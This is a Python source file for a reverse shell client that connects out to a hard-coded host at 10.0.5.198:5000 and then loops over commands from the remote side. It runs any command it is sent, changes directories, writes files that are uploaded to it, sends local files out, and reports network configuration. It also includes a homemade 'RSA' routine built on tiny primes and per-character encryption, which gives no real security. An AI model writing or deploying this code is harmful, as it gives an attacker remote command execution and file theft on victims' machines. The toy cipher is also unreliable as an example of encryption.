import os
import socket
import subprocess
import random


def rsa(plaintxt, n, publ_key):
    numEncrypt = []
    plaintxt = list(plaintxt)
    cipher = ''

    for letter in plaintxt:
        numEncrypt.append(ord(letter))
    for number in numEncrypt:
        encrypt = (number ** publ_key) % n
        cipher += chr(encrypt)
    return cipher


def d_rsa(ciphertxt, n, priv_key):
    numDecrypt = []
    plaintxt = ''
    ciphertxt = list(ciphertxt)

    for letter in ciphertxt:
        numDecrypt.append(ord(letter))
    for number in numDecrypt:
        decrypt = (number ** priv_key) % n
        plaintxt += chr(decrypt)
    return plaintxt


def ifconfig():
    result = subprocess.getoutput('ifconfig')
    with open("ifconfig.txt", "wb") as ipfile:
        ipfile.write(result.encode())
        ipfile.close()


key_database = ["ATYDbuiNGuiOJ", "uhijNFRFSohYOygnygh", "BFyuutbf76FBiitbF", "JRVBCUrtbuefdFBDv"]

pc = 83
qc = 61
nc = pc * qc
pu_k = [53, nc]
pr_k = [557, nc]

HOST = "10.0.5.198"
PORT = 5000
BUFFER = 1024 * 62
SEP = "<separator>"

s = socket.socket()
s.connect((HOST, PORT))

tx = str(pu_k[0]) + SEP + str(pu_k[1]) + SEP
tx += key_database[random.randint(0, len(key_database) - 1)]
s.send(tx.encode())

serverKey = d_rsa(s.recv(BUFFER).decode(), pr_k[1], pr_k[0])
serverKey = serverKey.split(SEP)

serverKey[0] = int(serverKey[0])
serverKey[1] = int(serverKey[1])

cwd = os.getcwd()
s.send(rsa(cwd, serverKey[1], serverKey[0]).encode())

while True:
    command = s.recv(BUFFER).decode()

    if command.lower() == "exit":
        break

    elif command[0:2].lower() == "cd":
        if command == "cd":
            continue
        if " " in command:
            cmd_div = command.split()
            if cmd_div[1] == "..":
                current_dir = os.getcwd()
                parentDir = current_dir[:current_dir.rfind("/")]
                os.chdir(parentDir)
                output = "Success!"
            else:
                try:
                    print(cmd_div)
                    os.chdir(cmd_div[1])
                    output = "Success!"
                    print("success!")
                except FileNotFoundError as error:
                    output = str(error)
                else:
                    output = ""
        else:
            output = "Invalid command."

    elif command[0:6].lower() == "upload":
        cmd_div = command.split()
        with open(cmd_div[1], "wb") as file:
            content = s.recv(BUFFER)
            file.write(content)
            file.close()
        output = "[+] Upload Successful!"

    elif command[0:8].lower() == "download":
        cmd_div = command.split()
        with open(cmd_div[1], "rb") as file:
            content = file.read(BUFFER)
            s.send(content)
            file.close()
        output = "[+] Download Successful!"

    elif command == 'ifconfig':
        ifconfig()
        with open('ifconfig.txt', 'rb') as file:
            output = file.read(BUFFER).decode()
            file.close()

    else:
        output = subprocess.getoutput(command)


    print(output)
    print(os.getcwd())

    cwd = os.getcwd()
    message = str(output)
    s.send(message.encode())
    ack = s.recv(BUFFER).decode()
    s.send(cwd.encode())

s.close()
